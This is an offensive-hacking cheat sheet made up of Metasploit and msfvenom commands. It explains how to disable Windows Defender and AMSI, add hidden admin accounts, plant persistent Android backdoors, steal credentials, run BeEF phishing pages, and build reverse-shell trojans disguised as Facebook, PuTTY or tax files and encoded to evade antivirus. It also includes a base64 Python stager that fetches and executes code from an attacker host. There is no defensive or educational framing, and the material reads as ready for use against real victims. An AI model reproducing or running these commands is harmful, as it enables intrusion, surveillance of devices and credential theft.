#then add exlusion path to keep it off and contained this will eclused the file named from being scanned!

windows powershell

"Add-MpPreference -ExclusionPath "c:\"





if failed try this "out of powershell"

Add-MpPreference -ExclusionPath "c:\"



##Stop windows from flagging powershell scripts by disabling AMSI!
""[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)"


#check for shared creds
"check if the computer at the ip address used is sharing creds with current hacked box you are inif so you can use the creds already gained to access these devices try rdp and use "arp -a" to find other device without making noice like nmae or other port scanners."

dir \\10.0.0.56\C$



********************************************************************************************
#android shell commands

install a apk file              "adb install /sdcard/update.apk"

go to home screen    input keyevent 3


google search by entering text on home screen   input keyevent 3    input text 'what%you%want%tosearch'


vol down 1    "input keyevent 24" 


vol up one    "input keyevent 25"


press enter     input keyevent 66


make text     input text 'hello%world%how%are%you'


kill a task    killtask "PID number"


see all apps     pm list packages       "hit pm for help"


see all apps plus files     pm list package -f

 
hit am for help


start a app     am "apps name"    "am update.apk"


open a web page by pass defult broswer      am start -n org.mozilla.firefox/.App http//:www.google.com


open a beef page bypass defult broswer     am start -n org.mozilla.firefox/.App http//71.35.122.58:3000/demos/basic.html


open a beef webpage    am start -a amdroid.imtent.action.VEIW -d "http://www.71.58.1222.35:3000/demos/basic.html"

open a webpage     open a beef webpage    am start -a android.imtent.action.VEIW -d "http://www.google.com"
****************************************************************************
#set up persistance   "backgroud session and type 

use post/windows/manage/persistance

set LPORT 

set LHOST

set rexe "make a trojan named ciauz.exe drag it here"

exploit

**** how to pivot  ******

control Z to backgroud session


route add "target ip" "255.255.255.0" "and session id to pivot from"




use windows/smb/08_067_netapi or another exploit

*************************************************************************************************************************************************************

upload 2nd trojan to target

cd cd /sdcard/

upload '/root/Desktop/LookoutAndroidAntiVirus.apk' /sdcard/ 

"port443"



***********************************************************************************************************************************************
#upload backdoor easy way save to cd/ cd etc cd init.d or in sdcard


cd / 

cd / etc 

cd / etc / init.d

*****"or save to"*******

cd

cd / sdcard

upload '/root/Desktop/Androidupdate.sh' /sdcard/


"or"


upload '/root/Desktop/AndroidBackdoor.sh'  /sdcard/




shell

cd /

cd / sdcard

sh Androidupdate.sh

nohup sh Androidupdate.sh

"and or"

sh AndroidBackdoor.sh

nohup sh AndroidBackdoor.sh


"you want it to return starting: intent after you run the backdoor"
***************************************************************************************************************************************
cd /

ls

cd / etc  

ls 

cd / init.d  

upload '/root/Desktop/AndroidBackdoor.sh' /sdcard/

cd sdcard          cd storage

cd download

ls         "find your apk
'

upload AndroidBackdoor.sh

cd download   "check for backdoor upload"

shell

cd /

ls

cd sdcard

ls

cd download           "find back door in shell"

ls

sh Android Backdoor.sh    "press control c"


exit

exploit     "must upload backdoor to cd /sdcard/ or cd /etc/init.d if root for presitance"
*******************************************************************************************************************************
#Windows Persistance mesures 
#create new user with cmd shell "for prestance or psexec exploit"

net user "bob" password /add  "to create account with the name of bob password pass

net localgroup administrators "bob" /add     "to make it a admin account"

net user bob 123456  "to change password to 123456"

#change a usrs password
net user "to see all users on pc"

net user "user name" *     "to change password for that user"

************************************************************************************************************************************************************
#open broswer to beef hooked phining page  from windows shell "CMD"

start firefox 71.58.122.35

start firefox 10.0.0.170

#start broswer to beef hooked showbox page

start Firefox http://71.58.122.35:12345/www.%2FFreeMoviesandTV.com%2FShow+Box%2FShowBoxdownload.html

#open to beef demo page 

start firefox http://10.0.0.15:3000/demos/basic.html

****start a beef hooked page on android*****
#open beef demo wlan

activity_start intent://71.35.122.58:3000/demos/basic.html#Intent;scheme=http;action=android.intent.action.VEIW;end


#open show box hooked phising page wlan

activity_start intent://http://71.58.122.35:12345/www.%2FFreeMoviesandTV.com%2FShow+Box%2FShowBoxdownload.html#Intent;scheme=http;action=android.intent.action.VEIW;end

#open to hooked phising page 

activity_start intent://71.35.122.58#Intent;scheme=http;action=android.intent.action.VEIW;end



*****************************************************************************************************************************************************************************************************

#remote dns spoofing by editing windows host file

host file location C:\WINDOWS\system32/drivers/etc/hosts

cd C:\

cd / windows

cd / drivers

cd / etc etc

ls

rm hosts host.old

upload   "insert file"   C:\windows\system32/drivers/etc/

*********************************************************************************************************************************************
post mods

run post/windows/garther/enum_applications  "see all programs running"


run post/multi/recon/local_exploit_suggester      "this will let use know if the system is exploitable to other exploits"


run post/windows/gather/cerdentials/credential_collector   "get sys info hashes admin pass etc"   "to crack hashes use hashcat!"

"hashcat in termianl to crack hashes" 




run post/windows/gather/
checkvm       "see if pc is a vm"


post/windows/gather/phish_windows_credentials  "lunches a phishing pop up asking for user creds to contuine using the pc"


"this will try to elevate privs via migtation"

use post/windows/manage/migrate

set SESSION 1

exploit



*******************************************************************************************************************************************************************
#VNC Payload Notes
get vnc viewer control

use multi/handler

"set your payload to"

set PAYLOAD windows/vncinject/reverse_tcp

show options

set VeiwOnly false    "to be able to control the hacked computer via the vnc gui"

set LHOST 192.168.1.245   "set your lhost as your local ip address if you are doing this remotely use your public ip addres and port forwarding you can also use ngrok to use this payload remotely if you are using ngrok set the LHOST as 0.0.0.0"

set LPORT 443

#VNC payload example 

"VNC Payload with encryption and encoding making it less detectable to make the payload even less detectable remove bad chars and or a ecryption tool to add another layer of encryption"
msfvenom -p windows/vncinject/reverse_tcp --platform windows -a x86 --encrypt aes256 LHOST=192.168.1.245 LPORT=443 -f exe -e x86/shikata_ga_nai -i 10 > /root/VNC.exe

"VNC Payload without encoding or encryption"
msfvenom -p windows/vncinject/reverse_tcp --platform windows -a x86 LHOST=192.168.1.245 LPORT=443 -f exe > /root/VNC.exe





**********************************************************************************************************************************************************************
#hack mac linux unix windows device with a link and with metasploit

use exploit/mutli/java_jre17_jmxbean_2

set LHOST 10.0.0.224

set SRVHOST 10.0.0.224

set SRVPORT 443

set URIPATH /

set PAYLOAD java/meterpreter/reverse_tcp

exploit


********************************************************************************************************************************************************************************************
#browser exploits for metasploit"

"HTA attack"

use exploit/windows/misc/hta_server

set SRVHOST 10.0.0.224

set URIPATH /Update

exploit






use exploit/windows/browser/ms10_046_shortcut_icon_dllloader

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.0.0.15

set SRVHOST 10.0.0.15

set SRVPORT 80

set URIPATH /

exploit




use auxiliary/server/browser_autopwn

set LHOST 10.0.0.15

set URIPATH google

exploit




use exploit/multi/script/web_delivery

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.0.0.15

set LPORT 443

set URIPATH /google

set TARGET 2          "show targets"

exploit







use exploit/windows/http/badblue_passthru

set RPORT 80

set RHOST "target ip address"

exploit


use windows/broswer/adobe_flash_amv2

set RHOST 

exploit



use exploit/multi/browser/firefox_xpi_bootstrapped_addon

set SRVHOST 10.0.0.16

set URIPATH /

set LPORT 80

exploit

************************************************************************************************************************

#windows maloius pdf "may be used for android"
 
use windows/fileformat/adobe_pdf_embedded_exe_nojs

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 10.0.0.15

set LPORT 443

set FILENAME Urgent_New_Agenda443.pdf

exploit

"set up hanlder with windows payoad setting and port used in pdf and local ip"


********************************************************************************************************************
maloius pdf payload 


use windows/fileformat/adobe_pdf_embedded_exe

set PAYLOAD windows/meterpreter/reverse_tcp

set LHOST 192.168.1.

set LPORT 443

set FILENAME pdftest.pdf

set INFILENAME "drag a pdf file here"

exploit

"set up hanlder with windows payoad setting and port used in pdf and local ip"

**********************************************************************************************************************
#set a auto run script to run right at connection of shell

add this to options


set AutoRunScript post/windows/manage/smart_migrate

generate -t vba      "copy output"

***************************************************************************************************************************8
"MSFVENOM HELP LIST AND PAYLOAD EXAMPLES LISTED BELOW"

MsfVenom - a Metasploit standalone payload generator.
Also a replacement for msfpayload and msfencode.
Usage: /usr/bin/msfvenom [options] <var=val>
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe

Options:
    -l, --list            <type>     List all modules for [type]. Types are: payloads, encoders, nops, platforms, archs, encrypt, formats, all
    -p, --payload         <payload>  Payload to use (--list payloads to list, --list-options for arguments). Specify '-' or STDIN for custom
        --list-options               List --payload <value>'s standard, advanced and evasion options
    -f, --format          <format>   Output format (use --list formats to list)
    -e, --encoder         <encoder>  The encoder to use (use --list encoders to list)
        --sec-name        <value>    The new section name to use when generating large Windows binaries. Default: random 4-character alpha string
        --smallest                   Generate the smallest possible payload using all available encoders
        --encrypt         <value>    The type of encryption or encoding to apply to the shellcode (use --list encrypt to list)
        --encrypt-key     <value>    A key to be used for --encrypt
        --encrypt-iv      <value>    An initialization vector for --encrypt
    -a, --arch            <arch>     The architecture to use for --payload and --encoders (use --list archs to list)
        --platform        <platform> The platform for --payload (use --list platforms to list)
    -o, --out             <path>     Save the payload to a file
    -b, --bad-chars       <list>     Characters to avoid example: '\x00\xff'
    -n, --nopsled         <length>   Prepend a nopsled of [length] size on to the payload
        --pad-nops                   Use nopsled size specified by -n <length> as the total payload size, auto-prepending a nopsled of quantity (nops minus payload length)
    -s, --space           <length>   The maximum size of the resulting payload
        --encoder-space   <length>   The maximum size of the encoded payload (defaults to the -s value)
    -i, --iterations      <count>    The number of times to encode the payload
    -c, --add-code        <path>     Specify an additional win32 shellcode file to include
    -x, --template        <path>     Specify a custom executable file to use as a template
    -k, --keep                       Preserve the --template behaviour and inject the payload as a new thread
    -v, --var-name        <value>    Specify a custom variable name to use for certain output formats
    -t, --timeout         <second>   The number of seconds to wait when reading the payload from STDIN (default 30, 0 to disable)
    -h, --help                       Show this message

msfvenom --list encoders "to list all encoder types"

msfvenom --list ecryption "to list all ecrytyion types"

msfvenom --list platforms  "list all platform types"

msfvenom --list formats  "list all file format types"

msfvenom --list all  "list all"


#create shellcode using msfvenom
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.11 LHOST 443 -f 

msfvenom -p mac/x86/meterpreter/reverse_tcp LHOST=192.168.1.11 LHOST 443 -f 

msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=192.168.1.11 LHOST 443 -f 



***********************************************************************************************************************************************************************************
#MAKE PAYLOAD APKS
#lan mode
***************************************************************************************************************************************************************************************************************
#basic apk payload "set payload to reverse_https and use port 443 to get past firewalls use diffrent options to change edit and customize thr psyload if root place the payloads in the /etc/init.d file for persistance add a "start am mainactvity" script as well you can use a bash script for a form of android persistance without root"

"TCP"
msfvenom -p android/meterpreter/reverse_tcp -f apk -a dalvik --platform android LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.apk

"https"
msfvenom -p android/meterpreter/reverse_https -f apk -a dalvik --platform android LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.apk

"stageless android tcp apk payload"
msfvenom -p android_meterpreter_reverse_tcp -f apk --platform android -f apk LHOST=192.168.1.11 LPORT=443 R > /root/http.apk

"staged tcp android apk payload bad chars removed"
msfvenom -p android/meterpreter/reverse_tcp -f apk -a dalvik --platform android -b /0x78/ LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.apk

"port binded tcp android apk payload"
msfvenom -p android/meterpreter/bind_tcp -a dalvik --platform android  LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.apk

"bind a https apk msfvenom android payload to another apk"
msfvenom -x /root/app.apk -p android/meterpreter/reverse_https -f apk -a dalvik --platform android  LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.apk

"msfvenom android shell payload"
msfvenom -p android/shell/reverse_tcp -f apk -a dalvik --platform android  LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.apk

"android java apk msfvenom payload"
msfvenom -p android/meterpreter/reverse_tcp -a dalvik -f java --platform android  LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.apk

msfvenom -p android/meterpreter/reverse_tcp -a dalvik -f java --platform android  LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.java

"android .elf msfvenom payload
msfvenom -p android/meterpreter/reverse_tcp -a dalvik -f elf --platform android  LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.elf

"persistance trick for rooted androids"
use the .elf payload and upload it to "/system/etc/init.d/"
"upload /system/etc/init.d/SHELL.elf"

"making a basic android .elf payload"
msfvenom -p android/meterpreter/reverse_tcp -f elf LHOST=192.168.1.11 LPORT=443 R > /root/SHELL.elf

"then start the payload or wait for reboot"
"execute /system/etc/init.d/SHELL.elf"

##########################

"encoded and encypted elf android payload"
msfvenom -p android/meterpreter/reverse_tcp -a dalvik -f elf --platform android -e x86/shikata_ga_nai --encrypt aes265 LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.elf

"encoded and encypted elf android payload bad chars removed"
msfvenom -p android/meterpreter/reverse_tcp -a dalvik -f elf --platform android -e x86/shikata_ga_nai --encrypt aes265 LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.elf

"encoded and encypted java android payload"
msfvenom -p android/meterpreter/reverse_tcp -a dalvik -f java --platform android -e x86/shikata_ga_nai --encrypt aes265 -b \x00\xff\ LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.java

"encoded and encypted java android payload bad chars removed"
msfvenom -p android/meterpreter/reverse_tcp -a dalvik -f java --platform android -e x86/shikata_ga_nai --encrypt aes265 -b \x00\xff\ LHOST=192.168.1.11 LPORT=443 R > /var/www/html/SHELL.java






#ADDING OPTIONS TO ANDROID MSFVENOM PAYLOADS "this will auto run commands upon being ran instantly"



"AUTO HIDE ANDROID APK PAYLOAD this will remove itself from the lunch once ran"

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=443 AndroidHideAppIcon=true -o /root/AutoHide.apk


msfvenom -p android/meterpreter/reverse_tcp LHOST=10.0.0.109 LPORT=443 AndroidHideAppIcon=true AndroidMeterpreterDebug=true AndroidWakelock=true -o options.apk


"use encoded multi handler for max avbypassing results also try https and rc4 payloads removing bad chars etc"


use multi/handler

set PAYLOAD android/meterpreter/reverse_https

set LPORT 443

set LHOST 192.168.1.11

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 10

exploit

****************************************************************************************************************************
#with encoding

msfvenom -p android/meterpreter/reverse_tcp -e x86/opt_sub -i 3 LHOST=10.0.0.15 LPORT=4444 R > /root/Desktop/Facebook.apk

**********************************************************************************************************************************
Metasploit shell code apks 

msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 AndroidHideAppIcon R > /root/AutoHide.apk

msfvenom -p android/meterpreter/reverse_https -f apk LHOST=71.58.126.12 LPORT=443 R > /root/https.apk

msfvenom -p android/meterpreter/reverse_http --platform android -f apk LHOST=192.168.1.11 LPORT=443 R > /root/http.apk


msfvenom -p android/meterpreter_reverse_tcp --platform android -f apk LHOST=192.168.1.220 LPORT=443 R > /root/rev2.apk


msfvenom -p android/meterpreter/reverse_tcp LHOST=71.58.122.35 LPORT=4444 R > /root/Desktop/Update.apk


**************************************************************************************************************************************
wlan
msfvenom -p android/meterpreter/reverse_tcp LHOST=71.58.122.35 LPORT=445 R > /root/Update.apk

msfvenom -p android/meterpreter/reverse_https LHOST=10.0.0.66 LPORT=443 R > /root/ShowBox.apk


*************************************************************************************************************************************

#bind android payload with metasploit

apt-get install lib32stdc++6 lib32ncurses5 lib32zl

apt-get install zipalign

msfvenom -x /root/Facebooklite.apk -p android/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -o /root/Facebook.apk

"if this fails goto the root folder place the real apk there then run the msfvenom script"


msfvenom -x FacebookLite.apk -p android/meterperter/reverse_tcp LHOST=71.58.122.35 LPORT=443 - o Facebook.apk

****************************************************************************************************************************

#bind payload to apk wlan mode

ruby apk-embed-payload.rb "name of app".apk -p android/meterpreter_reverse_tcp LHOST=10.0.0.170 LPORT=443



msfvenom -x Facebook Lite.apk -p android/meterpreter/reverse_tcp LHOST=71.58.122.34 LPORT=4444 -e x86/opt_sub -i 5 -o Facebook.apk

ruby apk.rb Facebook lite -p android/meterperter/reverse_tcp LHOST=10.0.0.170 LPORT=4444


#bind apk to payload 

start terminal as super user open and type su

msfvenom -x  exec: msfvenom -x /root/Desktop/Facebook Lite_v90.0.0.10.180_apkpure.com.apk -p android/meterpreter/reverse_tcp LHOST=71.35.122.58 LPORT=443 -o Facebook.apk -p android/meterpreter/reverse_tcp LHOST=71.35.122.58 LPORT=443 -o Facebook.apk

******************************************************************************************************************************************
#ngrok msfvenom android payload this can work for wwindows to.

./ngrok start --all  "to start ngrok with the configuration set by  editing the ngrok config file"       

copy the ngrok link used by ngrok as l host or type the command "host + the ngrok link" to get ngrok tunnes ip and use that as lhost   " ngrok link example   0.tcp.ngrok.io:11084 " use the port given by ngrok example to get ngrok tunnel ip   "   host 0.tcp.ngrok.io   " or ping 0.tcp.ngrok.io set the LHOST on the multi handler as 0.0.0.0"


msfvenom -p android/meterpreter/reverse_tcp LHOST=0.tcp.ngrok.io:11084 LPORT=11084 R > /root/payload.apk

or

msfvenom -p android/meterpreter/reverse_tcp LHOST=52.14.61.47 LPORT=11084 R > /root/payload.apk


"set your multi/handler as listed below"

use multi/handler

set LHOST 0.0.0.0

set LPORT 1234    "this is the port we used when editing the ngrok config file"

set PAYLOAD android/meterpreter/reverse_tcp



*********************************************************************************************************
#metasploit multi device hacking php shell code script

"basic tcp php msfvenom payload"
msfvenom -p php/meterpreter/reverse_tcp LHOST=192.168.1.11 LPORT=8080 -o /root/PHP404.php

"encoded php msf payload"
msfvenom -p php/meterpreter/reverse_tcp -e php/base64 -i 5 LHOST=192.168.1.11 LPORT=8080 -o /var/www/html/PHP404.php

"encoded and encypted php msfvenom meterpreter payload"
msfvenom -p php/meterpreter/reverse_tcp -e php/base64 -i 5 --encrypt aes265 LHOST=192.168.1.11 LPORT=8080 

"encoded and encypted php msfvenom meterpreter payload with bad chars removed"
msfvenom -p php/meterpreter/reverse_tcp -e php/base64 -i 5 --encrypt aes265 -b \x00\xff\ LHOST=192.168.1.11 LPORT=8080 R > /var/www/html/PHP404.php


"must use php/meterpreter/reverse_tcp payload on multi handler"
"use encoded multi handler for max avbypassing results also try https and rc4 payloads removing bad chars etc"


"other web payloads"
"asp win payload"
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 --encrypt aes256 LHOST=192.168.1.11 LPORT=443 -f asp -e x86/shikata_ga_nai -i 10 -o /var/www/html/SHELL.asp


"jsp JAVA meterpreter payload"
mesvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.1.11 LHOST=443 -f raw -o jspshell.jsp

"war shell msf payload"
mesvenom -p war_shell_reverse_tcp LHOST=192.168.1.11 LHOST=443 -f war -o warshell.war




use multi/handler

set PAYLOAD php/meterpreter/reverse_tcp;;

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true;;
;;
set Encoding x86/shikata_ga_nai

set Iterations 15

exploit
**************************************************************************************************************\
#python msfvenom payload "can be used with NXcrypted""listed from most detectable to least detectable"


"basic"
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -o /root/test.py



"encoded"
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 -o /root/test.py



"encoded and ecrypted"
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b -o /root/test.py



"encoded, encrypted and bad chars removed"
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b \x00\xff\x00\x0a -o /root/test.py



"for max av evasion use encoding and encryption"

"Encytpion types" "encoding types"
aes256              x86/opt_sub
base64              x86/bloxor
rc4                 x86/xor
xor                 x86/shikata_ga_nai


#python meterpreter payloads using msfvenom"
"encrypted encoded and bad chars removed from python meterpreter"

"base payload use https if possible"
msfvenom -p python/meterpreter/reverse_tcp LHOST=192.168.1.77 LPORT=443 -o /root/test.py

msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.77 LPORT=443 -o /root/test.py


msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.77 LPORT=443 -e x86/xor -i 5 --encrypt base64 -b \x00\xff\x00\x0a -o /root/test.py


"ecrypted and encoded no bad chars removed"
msfvenom -p python/meterpreter/reverse_https LHOST=192.168.1.77 LPORT=443 -e x86/xor -i 5 --encrypt base64 -o /root/test.py  



"encoded , encrypted payload with encoded shellcode"
msfvenom -p python/meterpreter/reverse_rc4 LHOST=192.168.1.77 LPORT=443 -e x86/oxr -i 5 -o /root/test.py  


"stagless python payload add encryption and encodinf if needed"
msfvenom -p python/meterpreter_reverse_tcp LHOST=192.168.1.77 LPORT=443 -o /root/test.py  


#Shell code that has been decode junk code added for ip 10.0.0.109 port 443 reverse https just encrypt it for a fully fud backdoor use the payload above to make this just decode them add junk code then reecode them and then encrypt it all!

#this ones ready to be cipherd just save it to a text editor it has ip od 10.0.0.109 port of 443 payload of rev https

import base64,sys;exec(base64.b64decode({2:str,3:lambda b:bytes(b,'UTF-8')}[sys.version_info[0]]('aW1wb3J0IHN5cwojZXVnZmhqdmhqY3J2ZWpodmhqamhrZmpoZmRqZAp2aT1zeXMudmVyc2lvbl9pbmZvCiNqZGpoanZramR2a2hqa2Rqa3Zqa2J2ZGpzYnZiaGRiaGpkc2JzZGhqaGpidmQKdWw9X19pbXBvcnRfXyh7MjondXJsbGliMicsMzondXJsbGliLnJlcXVlc3QnfVt2aVswXV0sZnJvbWxpc3Q9WydidWlsZF9vcGVuZXInLCdIVFRQU0hhbmRsZXInXSkKaHM9W10KI2ZoaGpiZmhqc2JkaGpzYmhkamhkc2JmaGpiaHNmYmhqYmZzamhkYmZoamJqaHNiZGhmYmoKaWYgKHZpWzBdPT0yIGFuZCB2aT49KDIsNyw5KSkgb3Igdmk+PSgzLDQsMyk6CglpbXBvcnQgc3NsCglzYz1zc2wuU1NMQ29udGV4dChzc2wuUFJPVE9DT0xfU1NMdjIzKQoJc2MuY2hlY2tfaG9zdG5hbWU9RmFsc2UKCXNjLnZlcmlmeV9tb2RlPXNzbC5DRVJUX05PTkUKCWhzLmFwcGVuZCh1bC5IVFRQU0hhbmRsZXIoMCxzYykpCm89dWwuYnVpbGRfb3BlbmVyKCpocykKI2hlZGhkaGZnZmdnZmdmZ2YKby5hZGRoZWFkZXJzPVsoJ1VzZXItQWdlbnQnLCdNb3ppbGxhLzUuMCAoV2luZG93cyBOVCA2LjE7IFRyaWRlbnQvNy4wOyBydjoxMS4wKSBsaWtlIEdlY2tvJyldCiNoZGprYnNiaGRiY2hiY2RqYmpkc2NiaGNiYmNqaHNkYmNoamJzamhjYmNqc2RoYmogICNqdWZoZHVoZmtoanNoZHNoawpleGVjKG8ub3BlbignaHR0cHM6Ly8xMC4wLjAuMTA5OjQ0My9EV0RIOW83aXZDQ2tVTEZFLXE5QXhRMmI3VGRoM2JnMXFuLWpKYjMnKS5yZWFkKCkpCg==')))


 
 



"use encoded multi handlerfor max avbypassing results also try https and rc4 payloads"


use multi/handler

set PAYLOAD python/meterpreter/reverse_tcp

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit



******************************************************************************************************************************
encoded windows trojans scripts
*******************************************************************************************************************************************
#REAL ENCODING SCRIPT!  #encoded msf payloads
#how to make undetecabale trojans"set payload to reverse_https and use port 443 to get past firewalls
"use a limited sized pauload the removal of bad chars ecrytion and encoding to make a less detecable payload you can use a ecryption tool to add more ecryption to the payload making it hader to detect play around with the options to find the best on for each device and version type"




msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 --encrypt aes256 LHOST=192.168.1.225 LPORT=443 -b '\x00\xff\' -n 1019 -f exe -e x86/shikata_ga_nai -i 5 -o /var/www/html/testSHELL.exe



msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.212 LPORT=445 -f exe -e x86/opt_sub -i 5 > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 LHOST=192.168.1.212 LPORT=443 -f exe -e x64/xor -i 10 > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 LHOST=10.0.0.16 LPORT=443 -f exe -e x86/opt_sub -i 5 > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 LHOST=10.0.0.15 LPORT=443 -f exe -e x86/shikata_ga_nai -i 25 R > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_https  --platform windows -a x86 LHOST=10.0.0.15 LPORT=443 -f exe -e x64/xor -i 15 -b \x00\xff R > /root/Desktop/EncryptedEvilTest.exe



#WLAN

msfvenom -p windows/meterpreter/reverse_tcp LHOST=71.58.122.35  --platform windows -a x86 LPORT=4444 -f exe -e x86/opt_sub -i 6 R > /root/Desktop/EncryptedEvilTest.exe



msfvenom -p windows/meterpreter/reverse_tcp LHOST=71.58.122.35  --platform windows -a x86 LPORT=4444 -f exe -e x86/shikata_ga_nai -i 25 R > /root/Desktop/ScammerSlammer.exe

"make payload small as possible"
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.11 LPORT=443 --platform windows -a x86 --smallest -o /root/smallestpayload.exe



"stageless payload add encryption and encoding if needed also diffrenet payloads can be used"

msfvenom -p windows/meterpreter_reverse_tcp --platform windows -a x86 LHOST=192.168.1.77 LPORT=443 -f exe > /root/SHELL.exe

"ecoded and ecypted stageless win msf payload example"
msfvenom -p windows/meterpreter_reverse_https --platform windows --smallest --encrypt aes265 -e x86/xor -a x86 LHOST=192.168.1.77 LPORT=443 -f exe > /root/SHELL.exe



"make a python file windows meterpreter payload most payloads can be made into many file types"

msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 --encrypt aes256 LHOST=192.168.1.77 LPORT=443 -f py -e x86/shikata_ga_nai -i 10 > /root/SHELL.py 


msfvenom -p windows/meterpreter/reverse_tcp LHOST=71.58.122.35  --platform windows -a x86 LPORT=445 -f exe -e x86/opt_sub -i 6 R > /root/Desktop/Taxes2015.exe


#use DLL files for less detectablity" 

msfvenom -p windows/meterpreter/reverse_https --platform windows -a x86 --encrypt aes256 LHOST=192.168.1.77 LPORT=443 -f dll -e x86/shikata_ga_nai -i 10 > /root/DLLSHELL.dll

"use REMOTE DDL INJECTOR" to inject the shellcode into s remote process to try and avoid AV priv esclation can be down by powersploit as well"



#vnc viewer playload for a gui interface to control the hacked pc"

msfvenom -p windows/meterpreter/reverse_vnc --platform windows -a x86 --encrypt aes256 LHOST=192.168.1.77 LPORT=443 -f exe -e x86/shikata_ga_nai -i 10 > /root/DLLSHELL.exe


"windows msfvenom payload types and examples"

win msf payload in asp file format"
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 --encrypt aes256 LHOST=192.168.1.11 LPORT=443 -f asp -e x86/shikata_ga_nai -i 10 -o /var/www/html/SHELL.asp

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 --encrypt aes256 LHOST=192.168.1.11 LPORT=443 -f asp -e x86/shikata_ga_nai -i 10 -o /var/www/html/SHELL.asp





"use encoded multi handler for max avbypassing results also try https and rc4 payloads"


use multi/handler

set PAYLOAD python/meterpreter/reverse_tcp

set LPORT 443

set LHOST 192.168.1.212

set EnableStagedEncoding true

set Encoding x86/shikata_ga_nai

set Iterations 15

exploit

*********************************************************************************************************************************************************

********************************************************************************************************************************************************
#windows Trojans Scripts


msfvenom -p --platform windows -a x86 -p windows/meterpreter/reverse_tcp LHOST=10.0.0.15 LPORT=443 -f exe -o /root/Desktop/EVIL.exe


how to make a windows trojan lan mode

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.0.0.15 LPORT=443 -o /root/Desktop/Trojan.exe


windows shell exe wlan mode.

msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=71.58.122.35 LPORT=443 -o /root/Desktop/Internet_Explorer.exe

  
msfvenom -p windows/meterpreter/reverse_tcp LHOST=71.58.122.35 --platform windows -a x86 LPORT=443 -f exe > /root/Desktop/Internet_Explorer.exe



#LAN Mode "set payload to reverse_https and use port 443 to get past firewalls"


msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.0.15 --platform windows -a x86 LPORT=443 -f exe > /root/Desktop/Internet_Explorer.exe


#LAN TROJAN
msfvenom -p windows/meterpreter/reverse_tcp --platform windows -a x86 -f exe LHOST=10.0.0.15 LPORT=443 -o /root/Desktop/EvilTrojan.exe


*****************************************************************************************************************************************************************
#bind real exes to metasploit msfvenom payloads
#Non Encoded

msfvenom -p windows/meterpreter/reverse_tcp -k --platform windows -a x86 -f exe LHOST=10.0.0.180 LPORT=443 -x '/root/Desktop/putty.exe' -o /root/puttty.exe


#bind exe with encoded msfvenom payload


msfvenom -p windows/meterpreter/reverse_tcp -k --platform windows -a x86 -f exe LHOST=10.0.0.180 LPORT=443 -e x86/shikata_ga_nai -i 15 -x '/root/putty.exe' -o /root/putty.exe

*************************************************************************************************************************************************************************************
#create msfvenom payload in the raw with encoding/encryption & bad chars can be used to bind with another exe


msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 -f raw > /root/putty.bin


msfvenom -p - -x '/root/putty.exe' -k -f exe -a x86 --platform windows -e x86/bloxor -i 5 > puttytest.exe < putty.bin


#bind raw encoded payload to a real exe and encode that

"or"


msfvenom -p windows/meterpreter/reverse_tcp -f raw LHOST=192.168.1.212 LPORT=443 -e x86/shikata_ga_nai -i 15 --encrypt aes256 -b \x00\xff\x00\x0a -o /root/putty.bin

